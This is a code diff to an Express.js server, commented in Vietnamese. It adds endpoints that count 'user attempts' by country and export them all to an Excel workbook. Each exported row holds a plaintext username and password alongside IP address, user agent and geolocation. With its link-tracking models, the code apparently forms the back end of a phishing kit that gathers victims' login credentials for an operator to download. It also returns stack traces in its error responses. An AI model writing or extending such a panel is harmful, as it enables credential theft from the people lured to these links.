@@ -7,6 +7,7 @@ const XLSX = require("xlsx");
 const User = require("./models/User");
 const LinkInfo = require("./models/LinkInfo");
 const VisitInfo = require("./models/VisitInfo");
+const UserAttempt = require("./models/UserAttempt");
 const auth = require("./middleware/auth");
 const geoip = require("geoip-lite");
 const axios = require("axios");
@@ -811,6 +812,217 @@ app.put("/api/linkInfo/:id", auth, async (req, res) => {
     res
       .status(500)
       .json({ message: "Error regenerating link", error: error.message });
+  }
+});
+
+// Endpoint để lấy thống kê userattempts
+app.get("/api/userattempts/stats/all", auth, async (req, res) => {
+  try {
+    // Lấy tất cả userattempts không filter theo userId
+    const attempts = await UserAttempt.find()
+      .sort({ timestamp: -1 })
+      .lean()
+      .exec();
+
+    console.log("Found attempts:", attempts.length); // Log để debug
+    console.log("Sample attempt:", attempts[0]); // Log mẫu một attempt để xem cấu trúc
+
+    // Tính tổng số attempts
+    const totalAttempts = attempts.length;
+
+    // Thống kê theo quốc gia
+    const countryStats = {};
+    attempts.forEach((attempt) => {
+      const country = attempt.country || "Unknown";
+      countryStats[country] = (countryStats[country] || 0) + 1;
+    });
+
+    // Đếm số người online (trong 5 phút gần nhất)
+    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
+    const onlineAttempts = attempts.filter(
+      (a) => new Date(a.timestamp) >= fiveMinutesAgo
+    );
+    const onlineCount = onlineAttempts.length;
+
+    // Thống kê online theo quốc gia
+    const onlineByCountry = {};
+    onlineAttempts.forEach((attempt) => {
+      const country = attempt.country || "Unknown";
+      onlineByCountry[country] = (onlineByCountry[country] || 0) + 1;
+    });
+
+    res.json({
+      totalAttempts,
+      countryStats,
+      onlineCount,
+      onlineByCountry,
+    });
+  } catch (error) {
+    console.error("Error getting userattempts stats:", error);
+    res.status(500).json({
+      message: "Error fetching userattempts statistics",
+      error: error.message,
+      stack: error.stack,
+    });
+  }
+});
+
+// Endpoint để tải về toàn bộ userattempts
+app.get("/api/userattempts/stats/download", auth, async (req, res) => {
+  try {
+    console.log("Connected to MongoDB:", mongoose.connection.readyState === 1);
+    console.log("Database name:", mongoose.connection.db.databaseName);
+    console.log(
+      "Collections:",
+      await mongoose.connection.db.listCollections().toArray()
+    );
+
+    // Lấy tất cả userattempts không filter theo userId
+    const attempts = await UserAttempt.find()
+      .sort({ timestamp: -1 })
+      .lean()
+      .exec();
+
+    console.log("Found attempts for download:", attempts.length); // Log để debug
+    if (attempts.length > 0) {
+      console.log(
+        "Sample attempt for download:",
+        JSON.stringify(attempts[0], null, 2)
+      ); // Log chi tiết một attempt
+    } else {
+      console.log("No attempts found in the database");
+    }
+
+    // Tạo workbook
+    const wb = XLSX.utils.book_new();
+
+    if (!attempts || attempts.length === 0) {
+      // Nếu không có dữ liệu, tạo một worksheet trống với headers
+      const emptyData = [];
+      const ws = XLSX.utils.json_to_sheet(emptyData, {
+        header: [
+          "ID",
+          "Username",
+          "Password",
+          "IP Address",
+          "User Agent",
+          "Country",
+          "Country Code",
+          "Region",
+          "City",
+          "Timezone",
+          "Currency",
+          "Languages",
+          "Calling Code",
+          "Attempt Count",
+          "Timestamp",
+        ],
+      });
+
+      // Điều chỉnh độ rộng cột
+      const colWidths = [
+        { wch: 25 }, // ID
+        { wch: 20 }, // Username
+        { wch: 20 }, // Password
+        { wch: 20 }, // IP Address
+        { wch: 100 }, // User Agent
+        { wch: 20 }, // Country
+        { wch: 15 }, // Country Code
+        { wch: 20 }, // Region
+        { wch: 20 }, // City
+        { wch: 20 }, // Timezone
+        { wch: 15 }, // Currency
+        { wch: 20 }, // Languages
+        { wch: 15 }, // Calling Code
+        { wch: 15 }, // Attempt Count
+        { wch: 20 }, // Timestamp
+      ];
+      ws["!cols"] = colWidths;
+
+      // Thêm worksheet trống vào workbook
+      XLSX.utils.book_append_sheet(wb, ws, "No Data");
+    } else {
+      // Nhóm dữ liệu theo quốc gia
+      const attemptsByCountry = {};
+      attempts.forEach((attempt) => {
+        const country = attempt.country || "Unknown";
+        if (!attemptsByCountry[country]) {
+          attemptsByCountry[country] = [];
+        }
+
+        // Map dữ liệu chính xác theo cấu trúc trong MongoDB
+        attemptsByCountry[country].push({
+          ID: attempt._id.toString(),
+          Username: attempt.username || "",
+          Password: attempt.password || "",
+          "IP Address": attempt.ip || attempt.ipAddress || "", // Thử cả hai trường ip và ipAddress
+          "User Agent": attempt.userAgent || "",
+          Country: attempt.country || "",
+          "Country Code": attempt.countryCode || "",
+          Region: attempt.region || "",
+          City: attempt.city || "",
+          Timezone: attempt.timezone || "",
+          Currency: attempt.currency || "",
+          Languages: attempt.languages || "",
+          "Calling Code": attempt.callingCode || "",
+          "Attempt Count": attempt.attemptCount || 0,
+          Timestamp: attempt.timestamp
+            ? new Date(attempt.timestamp).toLocaleString()
+            : "",
+        });
+      });
+
+      // Tạo worksheet cho mỗi quốc gia
+      Object.entries(attemptsByCountry).forEach(
+        ([country, countryAttempts]) => {
+          const ws = XLSX.utils.json_to_sheet(countryAttempts);
+
+          // Điều chỉnh độ rộng cột
+          const colWidths = [
+            { wch: 25 }, // ID
+            { wch: 20 }, // Username
+            { wch: 20 }, // Password
+            { wch: 20 }, // IP Address
+            { wch: 100 }, // User Agent
+            { wch: 20 }, // Country
+            { wch: 15 }, // Country Code
+            { wch: 20 }, // Region
+            { wch: 20 }, // City
+            { wch: 20 }, // Timezone
+            { wch: 15 }, // Currency
+            { wch: 20 }, // Languages
+            { wch: 15 }, // Calling Code
+            { wch: 15 }, // Attempt Count
+            { wch: 20 }, // Timestamp
+          ];
+          ws["!cols"] = colWidths;
+
+          // Thêm worksheet vào workbook
+          XLSX.utils.book_append_sheet(wb, ws, country);
+        }
+      );
+    }
+
+    // Tạo buffer
+    const excelBuffer = XLSX.write(wb, { bookType: "xlsx", type: "buffer" });
+
+    // Gửi file
+    res.setHeader(
+      "Content-Type",
+      "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
+    );
+    res.setHeader(
+      "Content-Disposition",
+      "attachment; filename=userattempts_all.xlsx"
+    );
+    res.send(excelBuffer);
+  } catch (error) {
+    console.error("Error downloading all userattempts:", error);
+    res.status(500).json({
+      message: "Error downloading userattempts",
+      error: error.message,
+      stack: error.stack,
+    });
   }
 });
 
